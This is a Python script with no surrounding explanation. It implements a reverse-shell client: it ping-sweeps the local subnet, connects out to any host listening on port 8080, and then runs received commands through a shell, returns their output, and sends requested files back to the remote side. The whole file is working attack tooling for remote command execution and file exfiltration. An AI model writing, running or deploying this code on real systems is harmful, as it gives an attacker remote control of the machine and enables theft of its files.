#!/bin/python


import threading
import multiprocessing
import subprocess
import time
import os
import sys
import socket
import platform
import re


class ExitException(Exception):
   def __init__(self, message):
      super().__init__(message)

def socket_create():
   return socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def get_network_info():
   if "Linux" in platform.system():
      ip_address = os.popen("ifconfig | grep 'inet ' | tail -1 | cut -d ' ' -f10").read()
      return ip_address.strip()
   elif "Windows" in platform.system():
      ipconfig = os.popen('ipconfig').readlines()
      for line in ipconfig:
         if "  IPv4" in line:
            ip_address = line.split(":")[-1].strip()
            return ip_address


def ping_ip(ip, live_ips):
   ##get the correct ping command
   if "Windows" in platform.system():
      ping_response = os.popen("ping -n 1 -w 1000 {}".format(ip)).read()
   elif "Linux" in platform.system():
      ping_response = os.popen("ping -c 1 -w 1 {}".format(ip)).read()

   ##check if the computer is live
   if "TTL" in ping_response.upper():
      live_ips.append(ip)
      return live_ips
   else:
   	pass
   return live_ips


def ping_sweep(ip_address):
   live_ips = list()   
   ##sweep through ip range 2 - 255, to find reachable targets
   for ip in range(2,255):
      ip = '.'.join(ip_address.split(".")[:-1]) + "." + str(ip)
      if ip == "":
         continue
      else:
         thread = threading.Thread(
            target = ping_ip,
            args = (ip, live_ips,)
         )
         thread.start()
   return live_ips

##def ping_sweep(ip_address):
##   manager = multiprocessing.Manager()
##   live_ips = manager.list()   
##   ##sweep through ip range 2 - 255, to find reachable targets
##   for ip in range(2,255):
##      ip = '.'.join(ip_address.split(".")[:-1]) + "." + str(ip)
##      if ip == ip_address:
##         continue
##      else:
##         ping_process = multiprocessing.Process(
##            target = ping_ip,
##            args = (ip, live_ips,)
##         )
##         ping_process.start()
##   return list(live_ips)


def scan_for_reverse_shell(live_ips, port):
   for ip in live_ips:
      try:
         s = socket_create()
         s.settimeout(5)
         s.connect((ip, port))
         s.settimeout(None)
         #print("connected to {}".format(ip))
         return s
      except Exception as ex:
         s.close()
         print(ex.__str__())
      finally:
         #s.close()
         print("Tried {}".format(ip))


def change_dir(s, filepath):
   os.chdir(filepath)
   s.send("Change dir to {}".format(filepath).encode())


def transfer_file(s, filename):
   if os.path.exists(filename):
      FILE = open(filename, "rb")
      while True:
         data = FILE.read(1024)
         if not data:
            break
         else:
            s.send(data)
      FILE.close()
      s.send("DONE".encode())
   else:
      s.send("Unable to retrieve {}".format(filename).encode())


def send_terminal_output(s, command):
   cmd = subprocess.Popen(
   	command.decode(),
   	shell=True,
   	stdout=subprocess.PIPE,
   	stderr=subprocess.PIPE,
   	stdin=subprocess.PIPE
   )
   stdout, stderr = cmd.communicate()
   if stderr.decode() or stdout.decode():
      s.send(stdout + stderr)
   else:
      s.send("command executed...".encode())



if __name__=="__main__":
   port = 8080
   ip_address = get_network_info()
   live_ips = ping_sweep(ip_address)
   s = scan_for_reverse_shell(live_ips, port)
   if s:
      while True:
         try:
            command = s.recv(2048)
            if "exit" in command.decode():
               raise ExitException("Exiting shell...")
            elif "download" in command.decode():
               filename = command.decode().split("download")[1].strip()
               transfer_file(s, filename)
            elif "cd" in command.decode():
               filepath = command.decode().replace("cd","").strip()
               change_dir(s, filepath)
            elif not command.decode().strip():
               s.send("Enter a command...".encode())
            else:
               send_terminal_output(s, command)
         except KeyboardInterrupt:
            break
         except ExitException:
         	s.send("Exiting shell...".encode())
         	break
         except Exception as ex:
         	break
      s.close()
